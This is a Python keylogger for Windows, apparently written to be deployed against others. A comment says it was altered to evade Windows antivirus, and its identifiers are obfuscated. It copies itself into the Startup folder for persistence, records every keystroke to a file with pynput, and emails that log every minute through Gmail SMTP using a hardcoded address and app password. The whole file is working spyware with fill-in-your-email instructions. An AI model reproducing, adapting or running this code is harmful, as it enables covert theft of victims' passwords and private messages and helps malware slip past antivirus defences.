"""
Some lines in this program were altered in order to pass windows antivirus
"""
import os
import smtplib
from email.message import EmailMessage
from pynput import keyboard
import time
import shutil
from getpass import getuser
try:
    fdksloeroeo = getuser()
    f9vfoeoLSSHEKDVKJBIF99 = f"C:\\Users\\{fdksloeroeo}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    v9v9r999ruoooodfowoO99IO = os.path.join(os.getcwd(), '')#enter filename
    shutil.copy(v9v9r999ruoooodfowoO99IO, f9vfoeoLSSHEKDVKJBIF99)
except:
    pass
def OSFPGHROIGHEOPRGOHIERGE5859EGHITIEG9GOSJFherkjbdfvk4in495():
    def ehehheehhehiiisisissiissi(PFGfirouf9348o):
        print(str(PFGfirouf9348o))
        txt = open('logs.txt', 'a')

        try:                                              
            char = PFGfirouf9348o.char
            txt.write(char)
        except:
            dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = str(PFGfirouf9348o)
            if dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.enter":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = "\nKey.Enter|"
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.tab":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = "\t"
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.space":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = " "
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.shift":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = ""
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.backspace":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = " BACKSPC "
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.ctrl_l" or dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.ctrl_r":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = ""
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.caps_lock":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = ' CAPSLOCK '
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.right":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = ' RIGHTARROW '
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.left":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = ' LEFTARROW '
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.up":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = ' UPARROW '
            elif dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf == "Key.down":
                dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf = ' DOWNARROW '
            else:
                pass
            txt.write(dfdtaie578vhieruiegh8458gheu8IFIBVNE9VRVUEI78859tiegeughitniidsfvnvihdf)
    if __name__ == "__main__":
        dkcnREEIRIUGEURGEU4 = keyboard.Listener(on_press=ehehheehhehiiisisissiissi)
        dkcnREEIRIUGEURGEU4.start()
        print("hi")
        prevtime = time.time()
        while True:
            currenttime = time.time()
            # CHANGE THE NUMBER TO WHATEVER INTERVAL THAT YOU WANT UPDATES (IN SECONDS)
            if currenttime - prevtime > 60:
                emaislsllslslslslslslsslslsll()
                prevtime = time.time()


def emaislsllslslslslslslsslslsll():    
    # PUT WHATEVER EMAIL YOU WANT TO SEND FROM HERE (ONE OF YOUR EMAILS)                                                            
    email_user = "wnwi72@gmail.com"#enter your email
    email_pass = "vnimxermalydwtus"#enter your app password

    filename = "logs.txt"
    msg = EmailMessage()
    # WHATERVER NUMBER YOU SET EARLIER SHOULD BE REFLECTED IN THE EMAIL SUBJECT (FOR VISUAL PURPOSES)
    msg['subject'] = "Keys Logged in the past minute"
    msg['From'] = email_user
    msg['To'] = ""#enter your email here 
    msg.add_attachment(open(filename, "r").read(), filename=filename)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(email_user, email_pass)
        smtp.send_message(msg)
        print("email sent")

OSFPGHROIGHEOPRGOHIERGE5859EGHITIEG9GOSJFherkjbdfvk4in495()